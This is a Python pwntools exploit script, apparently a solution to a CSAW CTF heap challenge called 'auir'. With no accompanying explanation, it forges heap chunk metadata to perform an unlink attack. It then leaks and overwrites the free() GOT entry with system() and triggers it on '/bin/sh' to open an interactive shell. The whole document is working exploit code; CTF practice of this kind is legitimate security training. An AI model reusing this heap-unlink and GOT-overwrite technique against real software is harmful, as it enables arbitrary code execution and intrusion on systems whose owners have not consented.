#!/usr/bin/python
from pwn import *
from math import pow
def make_z(p,size,skills):
    p.sendlineafter('>>','1')
    p.sendlineafter('>>',str(size))
    p.sendlineafter('>>',skills)

def delete_z(p,z):
    p.sendlineafter('>>','2')
    p.sendlineafter('>>', str(z))

def fix_z(p,z,size,skills):
    p.sendlineafter('>>','3')
    p.sendlineafter('>>',str(z))
    p.sendlineafter('>>',str(size))
    p.sendlineafter('>>',str(skills))

def display_skills(p,z):
    p.sendlineafter('>>','4')
    p.sendlineafter('>>',str(z))
    p.recvuntil('\n')
    return p.recvuntil('|---').strip('|----')

def go_home(p):
    p.sendlineafter('>>','5')


def print_hex(x):
    for j in list(x):
        print '0x'+j.encode('hex'),
    print ''

def address_hex(x):
    lst = list(x)
    address = 0x00
    for i in range(len(lst)):
        val = lst[i]
        if val != '\x00':
            mult = int(pow(256,i))
            address += int(val.encode('hex'),16) * mult
    return address 

buffer_address = 0x605310
free_got = 0x605060
p = process('./auir')
#p = remote('pwn.chal.csaw.io',7713)
make_z(p,0x100,'abc')
make_z(p,0x100, p64(0x91) * (0x100/8)) 
make_z(p,0x100,p64(0x140)*(0x100/8))

delete_z(p,0)

fix_z(p,0,0x120,
    p64(0x1337) + #prev_size
    p64(0x101) + #size
    p64(buffer_address - 0x18) + #fd
    p64(buffer_address - 0x10) +#bk
    'a'*0xe0 +
    p64(0x100) +#prev_size
    p64(0x220))


delete_z(p,1)

fix_z(p,0,0x50,
    p64(0x1337)+
    p64(0x1337) +
    p64(0x1337) +
    p64(buffer_address)+
    p64(free_got))

x = display_skills(p,1)
free_func = (address_hex(x))
sys_func = free_func - 0x3f160

print len(p64(sys_func))
print hex(sys_func)
fix_z(p,1,0x8,p64(sys_func))

fix_z(p,2,0x8,'/bin/sh')
delete_z(p,2)
p.interactive()
